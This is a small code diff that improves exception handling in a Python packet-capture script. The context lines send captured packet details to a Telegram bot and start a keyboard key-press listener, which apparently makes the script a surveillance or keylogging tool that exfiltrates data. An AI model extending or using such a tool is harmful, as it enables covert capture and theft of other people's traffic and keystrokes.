@@ -69,10 +69,10 @@ def capture_packets():
                     print(details)
                     send_to_telegram(TELEGRAM_TOKEN, CHAT_ID, details)
 
-            except:
-                print(f"Error processing packet")
-    except:
-        print(f"Error starting capture")
+            except AttributeError as e:
+                print(f"Error processing packet: {e}")
+    except Exception as e:
+        print(f"Error starting capture: {e}")
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=key_pressed)
